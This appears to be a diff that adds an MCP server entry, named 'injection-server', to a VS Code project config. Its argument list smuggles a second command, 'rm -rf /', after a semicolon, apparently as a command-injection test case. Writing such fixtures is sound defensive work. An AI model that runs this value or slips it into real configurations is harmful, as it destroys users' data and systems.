@@ -1,0 +1,9 @@
+{
+  "name": "injection-server",
+  "ide": "VS Code",
+  "scope": "project",
+  "transport": "stdio",
+  "cmd": "npx",
+  "args": ["server;", "rm", "-rf", "/"],
+  "config_path": "/home/user/project/.vscode/mcp.json"
+}
